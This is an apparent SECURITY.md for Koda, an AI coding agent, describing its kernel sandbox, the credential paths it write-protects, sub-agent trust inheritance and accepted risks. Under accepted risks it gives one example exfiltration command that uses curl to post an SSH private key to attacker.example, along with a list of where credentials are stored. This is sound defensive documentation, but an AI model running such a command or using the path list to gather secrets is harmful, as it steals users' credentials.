# Security Policy

## Supported Versions

Only the latest published release receives security fixes.

## Reporting a Vulnerability

Please **do not** open a public GitHub issue for security vulnerabilities.

Email **security@koda.example** (or open a [GitHub Security Advisory][advisory])
with:
- A description of the vulnerability
- Steps to reproduce
- Potential impact assessment

You will receive a response within 48 hours. We aim to release a patch within
7 days of a confirmed vulnerability.

[advisory]: https://github.com/lijunzh/koda/security/advisories/new

---

## Sandbox Security Model

Koda runs every Bash command inside a kernel sandbox. This section documents
what the sandbox does and does not protect against.

### How it works

| Platform | Backend        | Always active? |
|----------|----------------|:-:|
| macOS    | `sandbox-exec` (seatbelt) | ✅ |
| Linux    | `bwrap` (bubblewrap)      | ✅ (if installed) |
| Windows  | Not supported             | — |

The sandbox is **always on** when the backend is available. There is no
opt-out. The [trust mode](docs/src/approval.md) only controls whether you
see a confirmation prompt before each mutation — it does not affect the
sandbox boundary.

If `bwrap` is not installed on Linux, Koda falls back to unsandboxed
execution **and** automatically downgrades Auto mode to require confirmation
for mutations, so you never lose both protections simultaneously.

### What the sandbox blocks

#### Write restrictions

Bash commands can only write to:
- The project directory (the directory Koda was launched from)
- `/tmp` and standard cache dirs (`~/.cache`, `~/.cargo`, `~/.npm`, etc.)

Writes anywhere else are blocked at the kernel level.

#### Credential write-protection

The following are **write-protected** (reads are allowed so CLI tools can
authenticate — see "Accepted risks" below):

| Path | Protects |
|------|---------|
| `~/.ssh` | SSH private keys |
| `~/.aws` | AWS credentials |
| `~/.gnupg` | GPG private keys |
| `~/.kube` | Kubernetes tokens |
| `~/.azure` | Azure CLI tokens |
| `~/.password-store` | pass(1) passwords |
| `~/.terraform.d` | Terraform cloud tokens |
| `~/.claude` | Claude Code session tokens |
| `~/.android` | Android debug keystores |
| `~/.config/gcloud` | gcloud credentials |
| `~/.config/gh` | GitHub CLI PATs |
| `~/.config/op` | 1Password tokens |
| `~/.config/helm` | Helm registry auth |
| `~/.config/netlify` | Netlify CLI tokens |
| `~/.config/vercel` | Vercel CLI credentials |
| `~/.config/fly` | Fly.io auth tokens |
| `~/.config/doppler` | Doppler secrets |
| `~/.config/stripe` | Stripe CLI API keys |
| `~/.config/heroku` | Heroku OAuth tokens |

**Credential files** write-protected (reads allowed):
`~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
`~/.docker/config.json`, `~/.vault-token`, `~/.env`

#### Fully blocked (read + write)

`~/.config/koda/db` — Koda's SQLite database stores API keys in plaintext.
Sandboxed commands have no legitimate reason to access it (the Koda process
runs outside the sandbox), so both reads and writes are denied.

#### Agent-file protection

Writes to `.koda/agents/` and `.koda/skills/` within the project are blocked
in all modes. This prevents a sandboxed command from modifying agent
definitions or skill files, which could alter system prompts or tool access on
the next session.

### Sub-agent sandbox inheritance

Child agents inherit the parent's trust mode and sandbox via
`TrustMode::clamp()`. A child can **never** run with less protection than its
caller. If the parent runs in Safe mode, the child runs in Safe mode even if
the agent JSON specifies `"mode": "auto"`.

### Accepted risks

**Credential exfiltration via network.** A sandboxed command can *read*
credential material and exfiltrate it over the network
(e.g. `curl https://attacker.example -d @~/.ssh/id_rsa`). Blocking reads
without blocking network egress is security theater — the model could also
obtain tokens from environment variables, process output, or CLI commands
like `gh auth token`. Network-level egress restriction is tracked in
[#844](https://github.com/lijunzh/koda/issues/844) and is the correct
long-term mitigation.

The only exception is `koda/db`: Koda's own API keys have no legitimate use
inside the sandbox, so full read+write deny is justified.

**No Windows sandbox.** Windows does not have a supported kernel sandbox
backend. Run Koda on Windows with care.

### Trust mode × tool effect matrix

See [Trust modes](docs/src/approval.md) for the full approval matrix.

---

## Dependency Security

CI runs `cargo audit --deny unsound --deny yanked` on every PR to catch
known vulnerabilities (RUSTSEC advisories) and yanked crate versions.
